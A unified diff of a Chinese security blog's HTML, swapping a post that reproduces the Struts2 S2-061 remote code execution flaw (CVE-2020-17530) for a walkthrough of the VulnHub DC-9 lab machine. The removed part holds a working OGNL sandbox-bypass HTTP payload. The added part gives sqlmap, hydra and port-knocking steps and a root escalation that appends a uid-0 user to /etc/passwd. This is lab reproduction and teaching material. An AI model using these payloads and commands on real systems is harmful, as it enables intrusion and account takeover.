@@ -21,32 +21,51 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="概述Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)Struts2 会对某些标签属性(比如 id，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %&amp;#123;x&amp;#125; 且 x 的值用户可控时，用户再传入一个 %&amp;#123;payload&amp;#125; 即可造成OGNL表达式执行。S">
+    <meta name="description" content="环境vulnhub项目 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F;靶机:172.16.17.150攻击机kali:172.16.17.140 描述 信息收集">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Struts2 S2-061漏洞复现">
-<meta property="og:url" content="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="vulnhub-dc9打靶">
+<meta property="og:url" content="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/index.html">
 <meta property="og:site_name" content="Syst1m">
-<meta property="og:description" content="概述Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)Struts2 会对某些标签属性(比如 id，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %&amp;#123;x&amp;#125; 且 x 的值用户可控时，用户再传入一个 %&amp;#123;payload&amp;#125; 即可造成OGNL表达式执行。S">
+<meta property="og:description" content="环境vulnhub项目 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F;靶机:172.16.17.150攻击机kali:172.16.17.140 描述 信息收集">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png">
-<meta property="article:published_time" content="2022-06-11T13:38:12.000Z">
-<meta property="article:modified_time" content="2022-06-12T13:05:12.670Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png">
+<meta property="article:published_time" content="2022-06-18T10:43:50.000Z">
+<meta property="article:modified_time" content="2022-06-18T12:41:22.436Z">
 <meta property="article:author" content="Syst1m">
-<meta property="article:tag" content="Struts2">
-<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="apache">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png">
 
 
-<link rel="canonical" href="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","path":"2022/06/11/Struts2S2-061漏洞复现/","title":"Struts2 S2-061漏洞复现"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/","path":"2022/06/18/vulnhub-dc9打靶/","title":"vulnhub-dc9打靶"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Struts2 S2-061漏洞复现 | Syst1m</title>
+<title>vulnhub-dc9打靶 | Syst1m</title>
   
 
 
@@ -149,7 +168,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#poc%E6%A3%80%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">poc检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">exp利用</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knock%E7%A2%B0%E6%92%9Essh"><span class="nav-number">4.2.</span> <span class="nav-text">knock碰撞ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%92%9E%E5%BA%93"><span class="nav-number">4.3.</span> <span class="nav-text">撞库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -241,7 +260,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/IMG_0010.JPG">
@@ -254,12 +273,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Struts2 S2-061漏洞复现 | Syst1m">
+      <meta itemprop="name" content="vulnhub-dc9打靶 | Syst1m">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Struts2 S2-061漏洞复现
+          vulnhub-dc9打靶
         </h1>
 
         <div class="post-meta-container">
@@ -269,15 +288,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2022-06-11 21:38:12" itemprop="dateCreated datePublished" datetime="2022-06-11T21:38:12+08:00">2022-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-06-12 21:05:12" itemprop="dateModified" datetime="2022-06-12T21:05:12+08:00">2022-06-12</time>
+      <time title="创建时间：2022-06-18 18:43:50 / 修改时间：20:41:22" itemprop="dateCreated datePublished" datetime="2022-06-18T18:43:50+08:00">2022-06-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -285,7 +298,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
         </span>
     </span>
 
@@ -306,16 +319,41 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)<br>Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p>
-<p>影响范围:Apache Struts 2.0.0-2.5.25</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub项目地址 <a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/struts2/s2-061/">https://vulhub.org/#/environments/struts2/s2-061/</a></p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="poc检测"><a href="#poc检测" class="headerlink" title="poc检测"></a>poc检测</h2><p>使用poc检测漏洞是否存在,需要使用url编码</p>
-<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="symbol">%</span><span class="number">25</span>%7b+%27test%<span class="number">27</span>+%2b+(<span class="number">11</span>+<span class="symbol">%</span><span class="number">2b+11</span>).toString()%7d</span><br></pre></td></tr></table></figure>
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>靶机:172.16.17.150<br>攻击机kali:172.16.17.140</p>
+<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,存在22端口,但是状态为filtered,怀疑被knockd保护<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png"></p>
+<p>扫目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png"></p>
+<p>web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png"></p>
+<p>挨个访问扫出来的目录,在访问session.php的时候发现已经登录,在下面提示文件不存在,可能存在文件包含漏洞<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png"></p>
+<p>猜一下接受参数的变量名,成功读取<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png"></p>
+<p>上面怀疑ssh被保护,现在用文件包含读取一下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png"></p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>文件包含没有能继续利用的电,查看其他功能点,发现一处搜索框,post传输数据,有搜索就有数据库交互,抓包fuzz<br>当语句为’or 1&#x3D;1 #时,产生注入,丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png"></p>
+<p>跑出账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch -D <span class="built_in">users</span> -T <span class="string">&#x27;UserDetails&#x27;</span> -C <span class="string">&#x27;password,username&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png"></p>
+<h2 id="knock碰撞ssh"><a href="#knock碰撞ssh" class="headerlink" title="knock碰撞ssh"></a>knock碰撞ssh</h2><p>安装knockd<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png"></p>
+<p>根据刚刚读到的端口,去敲门,逆序端口号,发现ssh已经对我们开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png"></p>
+<h2 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h2><p>利用跑出来的账号密码,拿去撞ssh,跑出三个账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwords.txt 172.16.17.150 ssh</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png"></p>
+<p>相继进入几个账号,翻翻翻*10,最后在janitor找到一个密码文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png"></p>
+<p>复制进passwd文件继续爆破,爆出一个新的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录看看以root权限运行的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png"></p>
+<p>find查找路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png"></p>
+<p>分析第一个test.py文件,读取第一个文件的内容,添加到第二个文件的末尾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png"></p>
+<p>生成一个密码hash,账号为domon 密码 123456</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt demon 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png"></p>
+<p>将生成的密码hash写入一个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash&#x27;</span> &gt;&gt; /tmp/demon</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png"></p>
+<p>再利用test命令写入&#x2F;etc&#x2F;passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test ./demon /etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p>审查元素看到回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png"></p>
-<h2 id="exp利用"><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h2><p>发送下面数据包</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>831</span><br><span class="line"></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span><br><span class="line"><span class="language-clean">Content-Disposition: form-data; name=<span class="string">&quot;id&quot;</span></span></span><br><span class="line"><span class="language-clean"></span></span><br><span class="line"><span class="language-clean">%&#123;(#instancemanager=#application[<span class="string">&quot;org.apache.tomcat.InstanceManager&quot;</span>]).(#stack=#attr[<span class="string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>]).(#bean=#instancemanager.newInstance(<span class="string">&quot;org.apache.commons.collections.BeanMap&quot;</span>)).(#bean.setBean(#stack)).(#context=#bean.get(<span class="string">&quot;context&quot;</span>)).(#bean.setBean(#context)).(#macc=#bean.get(<span class="string">&quot;memberAccess&quot;</span>)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(<span class="string">&quot;java.util.HashSet&quot;</span>)).(#bean.put(<span class="string">&quot;excludedClasses&quot;</span>,#emptyset)).(#bean.put(<span class="string">&quot;excludedPackageNames&quot;</span>,#emptyset)).(#arglist=#instancemanager.newInstance(<span class="string">&quot;java.util.ArrayList&quot;</span>)).(#arglist.add(<span class="string">&quot;whoami&quot;</span>)).(#execute=#instancemanager.newInstance(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)).(#execute.exec(#arglist))&#125;</span></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png"></p>
+<p>登录demon,拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png"></p>
 
     </div>
 
@@ -353,7 +391,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2 S2-061漏洞复现">https://syst1m.top/2022/06/11/Struts2S2-061漏洞复现/</a>
+      <a href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/" title="vulnhub-dc9打靶">https://syst1m.top/2022/06/18/vulnhub-dc9打靶/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -362,22 +400,19 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/Struts2/" rel="tag"># Struts2</a>
-              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/apache/" rel="tag"># apache</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/06/10/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%90%8E%E5%8F%B0getshll/" rel="prev" title="Tomcat弱口令后台getshll复现">
-                  <i class="fa fa-chevron-left"></i> Tomcat弱口令后台getshll复现
+                <a href="/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/" rel="prev" title="vulnhub-dc8打靶">
+                  <i class="fa fa-chevron-left"></i> vulnhub-dc8打靶
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="log4j2漏洞复现">
-                  log4j2漏洞复现 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
